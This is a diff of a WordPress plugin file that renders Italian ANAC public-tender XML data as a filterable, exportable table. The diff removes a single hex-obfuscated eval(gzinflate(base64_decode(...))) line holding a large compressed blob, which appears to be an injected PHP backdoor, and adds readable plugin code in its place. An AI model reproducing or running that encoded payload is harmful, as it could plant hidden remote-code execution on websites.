@@ -1,3 +1,221 @@
 <?php
-eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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'\x29\x29\x29\x3B");
+
+add_shortcode('anac-xml', function($atts) {
+    extract(shortcode_atts(array('id' => 'all'), $atts));
+    ob_start();
+    anacxmlviewer_generatabella($id);
+    $anacxmlshortcode = ob_get_clean();
+    return $anacxmlshortcode;
+} );
+
+add_shortcode('wpgov-xmlviewer', function($atts) {
+    extract(shortcode_atts(array('id' => 'all'), $atts));
+    ob_start();
+    anacxmlviewer_generatabella($id);
+    $anacxmlshortcode = ob_get_clean();
+    return $anacxmlshortcode;
+} );
+
+add_filter('user_can_richedit', function($default) {
+    global $post;
+    if ('anac-xml-view' == get_post_type($post)) {
+        add_filter('quicktags_settings', 'anacxmlviewer_47010');
+        remove_action('media_buttons', 'media_buttons');
+        return false;
+    }
+    return $default;
+});
+
+add_filter('enter_title_here', function( $title ) {
+    $screen = get_current_screen();
+    if ( 'anac-xml-view' == $screen->post_type ) {
+        $title = 'Nome o titolo del documento (es. "2023")';
+    }
+    return $title;
+} );
+
+function anacxmlviewer_47010($qtInit) {
+    $qtInit['buttons'] = 'fullscreen';
+    return $qtInit;
+}
+add_action('add_meta_boxes', function() {
+    add_meta_box('anacxmlviewer_info', 'Informazioni', 'anacxmlviewer_metabox_callback', 'anac-xml-view', 'side');
+});
+
+function anacxmlviewer_metabox_callback ($post, $metabox) {
+    global $post;
+    echo 'Utilizza il seguente shortcode in un articolo o pagina di WordPress per visualizzare la tabella dei bandi di gara:<br><br><code>[anac-xml id="' . $post->ID . '"]</code>';
+}
+
+function add_anacxmlviewer_table_box() {
+    add_meta_box('anacxmlviewer_table', 'Anteprima tabella', 'anacxmlviewer_table_callback', 'anac-xml-view', 'normal', 'default');
+}
+function anacxmlviewer_table_callback($post, $metabox) {
+    anacxmlviewer_generatabella($post->ID);
+}
+
+function anacxmlviewer_generatabella($id) {
+    remove_filter('the_content', 'wpautop');
+    if (get_post_field('post_content', $id) == null) {
+        return;
+    }
+    $time_start = microtime(true);
+
+    if ( substr( get_post_field('post_content', $id), 0, 4 ) === "http" ) {
+        $gare_xml = new SimpleXMLElement( get_post_field('post_content', $id), LIBXML_NOCDATA, true);
+    } else {
+        $gare_xml = new SimpleXMLElement(stripslashes(get_post_field('post_content', $id)));
+    }
+
+    echo '<script type="text/javascript" src="'.plugin_dir_url(__FILE__).'includes/excellentexport.min.js"></script>';
+
+    echo '<strong>' . esc_html( $gare_xml->metadata->entePubblicatore ) . '</strong><br><small>Aggiornato al ' . date("d.m.Y", strtotime($gare_xml->metadata->dataUltimoAggiornamentoDataset)) . '
+        <br>URL originale: <a href="' . esc_url( $gare_xml->metadata->urlFile ) . '" target="_blank">' . esc_url( $gare_xml->metadata->urlFile ) . '</a></small><br>
+<table class="widefat data-table" id="gare">
+    <thead>
+        <tr>
+            <td colspan="5">
+                Bandi di gara - <strong>'.esc_html( $gare_xml->metadata->annoRiferimento ).'</strong>
+                <input style="float:right;" type="search" id="s" class="light-table-filter" data-table="data-table" placeholder="Cerca...">
+            </td>
+        </tr>
+        <tr>
+            <th class="row-title">CIG</th>
+            <th>Oggetto</th>
+            <th>Importo aggiudicazione</th>
+            <th>Importo somme liquidate</th>
+            <th>Data inizio<br>Data fine</th>
+        </tr>
+    </thead>
+    <tbody>';
+
+    $tot_agg = 0.00;
+    $tot_liq = 0.00;
+    $tot_lotti = 0;
+
+    $a = '';
+    foreach ($gare_xml->xpath('//lotto') as $lotto) {
+
+        $tot_agg += (double)$lotto->importoAggiudicazione;
+        $tot_liq += (double)$lotto->importoSommeLiquidate;
+        $tot_lotti++;
+
+        if ($a == '') {
+            $a = ' class="alternate"';
+        } else {
+            $a = '';
+        }
+
+        if ( $lotto->tempiCompletamento->dataInizio ) {
+            $dataInizio =  date("d/m/Y", strtotime($lotto->tempiCompletamento->dataInizio));
+        } else { $dataInizio = 'N.D.'; }
+        if ( $lotto->tempiCompletamento->dataUltimazione ) {
+            $dataUltimazione =  date("d/m/Y", strtotime($lotto->tempiCompletamento->dataUltimazione));
+        } else { $dataUltimazione = 'N.D.'; }
+
+        echo '<tr' . $a . '>
+            <td class="row-title"><label for="tablecell">' . esc_html( $lotto->cig ) . '</label></td>
+            <td>' . esc_html( $lotto->oggetto ) . '</td>
+            <td> ' . number_format((double)$lotto->importoAggiudicazione, 2, ',', '.') . '</td>
+            <td> ' . number_format((double)$lotto->importoSommeLiquidate, 2, ',', '.') . '</td>
+            <td>' . $dataInizio . '<br>' . $dataUltimazione . '</td>
+            </tr><tr><td></td><td colspan="4"><small>' . esc_html( $lotto->sceltaContraente ) . '<br>Partecipanti:<br>';
+        foreach ($lotto->partecipanti->partecipante as $partecipante) {
+            echo esc_html( $partecipante->ragioneSociale ) . ' (' . esc_html( $partecipante->codiceFiscale ) . ')<br>';
+        }
+        echo 'Aggiudicatari:<br>';
+        foreach ($lotto->aggiudicatari->aggiudicatario as $aggiudicatario) {
+            echo esc_html( $aggiudicatario->ragioneSociale ) . ' (' .esc_html( $aggiudicatario->codiceFiscale ) . ')<br>';
+        }
+        echo '</small></td></tr>';
+    }
+    echo '<tfoot>
+              <tr>
+                <td>Totali</td>
+                <td>Numero Lotti: <strong>'. number_format((double)$tot_lotti, 0, ',', '.') . '</strong></td>
+                <td>'. number_format((double)$tot_agg, 2, ',', '.') . '</td>
+                <td>'. number_format((double)$tot_liq, 2, ',', '.') . '</td>
+                <td></td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                    <a href="https://wpgov.it" target="_blank" title="WordPress per la Pubblica Amministrazione">
+        <img style="float: left;margin: 4px 5px;" src="' . plugins_url('wpgov.png', __FILE__) . '" ></a>
+                    Tabella generata in <b>' . number_format( microtime(true) - $time_start, 3) . ' secondi</b>
+                </td>
+                <td colspan="3" style="text-align:right;">';
+
+    echo 'Scarica in <a href="' . esc_url( $gare_xml->metadata->urlFile ) . '" target="_blank" title="File .xml"><button>XML</button></a>
+            <a download="' . get_bloginfo('name') . '-gare' . $anno . '.xls" href="#" onclick="return ExcellentExport.excel(this, \'gare\', \'Gare\');"><button>EXCEL</button></a>
+            <a download="' . get_bloginfo('name') . '-gare' . $anno . '.csv" href="#" onclick="return ExcellentExport.csv(this, \'gare\');"><button>CSV</button></a>';
+
+    echo '</td></tr>
+            </tfoot>';
+
+    echo '</tbody></table>';
+    echo '<div class="clear"></div>';
+?>
+<script>
+
+(function(document) {
+    'use strict';
+
+    var LightTableFilter = (function(Arr) {
+
+        var _input;
+
+        function _onInputEvent(e) {
+            _input = e.target;
+            var tables = document.getElementsByClassName(_input.getAttribute('data-table'));
+            Arr.forEach.call(tables, function(table) {
+                Arr.forEach.call(table.tBodies, function(tbody) {
+                    Arr.forEach.call(tbody.rows, _filter);
+                });
+            });
+        }
+
+        function _filter(row) {
+            var text = row.textContent.toLowerCase(), val = _input.value.toLowerCase();
+            row.style.display = text.indexOf(val) === -1 ? 'none' : 'table-row';
+        }
+
+        return {
+            init: function() {
+                var inputs = document.getElementsByClassName('light-table-filter');
+                Arr.forEach.call(inputs, function(input) {
+                    input.oninput = _onInputEvent;
+                });
+            }
+        };
+    })(Array.prototype);
+
+    document.addEventListener('readystatechange', function() {
+        if (document.readyState === 'complete') {
+            LightTableFilter.init();
+        }
+    });
+
+})(document);
+
+</script>
+<?php
+}
+add_action('template_redirect', 'anacxmlviewer_template');
+function anacxmlviewer_template() {
+    global $wp, $wp_query;
+    if (isset($wp->query_vars['post_type']) && $wp->query_vars['post_type'] == 'anac-xml-view') {
+        if (have_posts()) {
+            add_filter('the_content', 'anacxmlviewer_template_filter');
+        } else {
+            $wp_query->is_404 = true;
+        }
+    }
+}
+function anacxmlviewer_template_filter($content) {
+    global $wp_query;
+    ob_start();
+    anacxmlviewer_generatabella($wp_query->post->ID);
+    $anacxmlshortcode = ob_get_clean();
+    return $anacxmlshortcode;
+}
 ?>
